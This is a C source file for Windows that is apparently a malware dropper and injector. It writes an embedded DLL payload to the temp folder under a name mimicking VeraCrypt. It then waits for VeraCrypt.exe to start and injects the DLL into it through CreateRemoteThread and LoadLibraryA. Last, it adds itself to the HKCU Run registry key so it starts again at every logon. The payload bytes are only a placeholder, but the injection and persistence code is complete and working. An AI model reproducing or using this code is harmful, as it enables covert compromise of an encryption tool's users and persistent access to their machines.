#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")


unsigned char DLL_Payload[14270] = { /* your payload data */ };


char pathToDLL[MAX_PATH] = "";

int SearchForProcess(const char *processName) {
    HANDLE hSnapshotOfProcesses;
    PROCESSENTRY32 processStruct;
    int pid = 0;
    
    hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
    
    processStruct.dwSize = sizeof(PROCESSENTRY32); 
    
    if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
        CloseHandle(hSnapshotOfProcesses);
        return 0;
    }
    
    while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
        if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
            pid = processStruct.th32ProcessID;
            break;
        }
    }
    
    CloseHandle(hSnapshotOfProcesses);
    
    return pid;
}


void GetPathToDLL() {
    GetTempPathA(MAX_PATH, pathToDLL);
    strcat(pathToDLL, "Vera_Crypt_dll.dll");
}


void UnpackDLL() {
    HANDLE hDLL_File = CreateFile(pathToDLL, FILE_ALL_ACCESS, FILE_SHARE_READ,
                                  NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD numBytes;
    if (hDLL_File == INVALID_HANDLE_VALUE){
        printf("Error while unpacking DLL\n");
    } else {
        WriteFile(hDLL_File, DLL_Payload, sizeof(DLL_Payload), &numBytes, NULL);
        CloseHandle(hDLL_File);
    }    
}


void AddToStart(const wchar_t* appName, const wchar_t* appPath) {
    HKEY hKey = NULL;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS){
        result = RegSetValueExW(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, (wcslen(appPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

int InjectDLLIntoProcess(const char* processName, const char* pathToDLL) {
    DWORD pid = 0;

    // Wait for the process to be found
    while (pid == 0) {
        pid = SearchForProcess(processName);
        Sleep(7000); //7s
    }

    printf("Process '%s' found with PID: %d\nInjecting DLL '%s'. ", processName, pid, pathToDLL);

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("OpenProcess failed! Error: %lu\n", GetLastError());
        return -2;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
    if (pRemotePath == NULL) {
        printf("VirtualAllocEx failed! Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return -3;
    }

    // Write the DLL path to the allocated memory in the target process
    if (!WriteProcessMemory(hProcess, pRemotePath, pathToDLL, strlen(pathToDLL) + 1, NULL)) {
        printf("WriteProcessMemory failed! Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -4;
    }

    // Get the address of LoadLibraryA in the target process
    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        printf("GetProcAddress failed! Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -5;
    }

    // Create a remote thread in the target process to load the DLL
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pRemotePath, 0, NULL);
    if (hRemoteThread == NULL) {
        printf("CreateRemoteThread failed! Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -6;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hRemoteThread, INFINITE);

    // Clean up resources
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("DLL injection successful!\n");
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
{
    GetPathToDLL();
    UnpackDLL();
    char processToInject[] = "VeraCrypt.exe";
    int result = InjectDLLIntoProcess(processToInject, pathToDLL);
    if (result != 0){
        printf("Failed to inject DLL\n");
        return result;
    }
    // adding into startup

    const wchar_t* appName = L"Vera_Crypt";
    wchar_t appPath[MAX_PATH];
    GetModuleFileNameW(NULL, appPath, MAX_PATH);
    AddToStart(appName, appPath);
    return 0;
}
















